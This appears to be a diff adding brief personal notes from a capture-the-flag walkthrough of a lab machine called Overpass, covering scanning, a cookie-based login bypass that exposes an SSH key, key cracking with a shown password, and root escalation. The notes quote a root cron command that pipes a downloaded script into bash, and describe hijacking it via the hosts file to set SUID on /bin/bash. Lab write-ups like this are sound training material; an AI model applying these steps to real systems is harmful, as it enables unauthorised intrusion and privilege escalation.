@@ -1,0 +1,40 @@
+Basic nmap scan.
+
+Browsed http page.
+
+Found JS on page source.
+
+Analysed buildscript and source code.
+
+Found admin page using gobuster.
+
+Tried sql injection.
+
+Used enum4linux.
+
+Used nikto.
+
+Used full port nmap scan.
+
+Found login.js on admin portal
+
+Setting cookie gives a private SSH key!
+
+John the ripper gives the password as james13 (Doesn't work????? --> Add a new line at the end of the private key)
+
+Run linpeas.sh
+
+Found root curl overpass.thm/downloads/src/buildscript.sh | bash
+This command is executed regularly (**** in linpeas.sh). And we can modify the hosts file. 
+
+Change the overpass.thm url to our machine's url.
+
+Make a www folder and simulate the entire folder structure to match the command.
+
+Add whatever command we want in our own buildscript.sh
+
+use chmod +s /bin/bash, giving SUID permission to bash usage. Making it executed by root everytime it is used.
+
+Fire up python http server on port 80 from the www directory.
+
+Use /bin/bash -p and boom you're root.
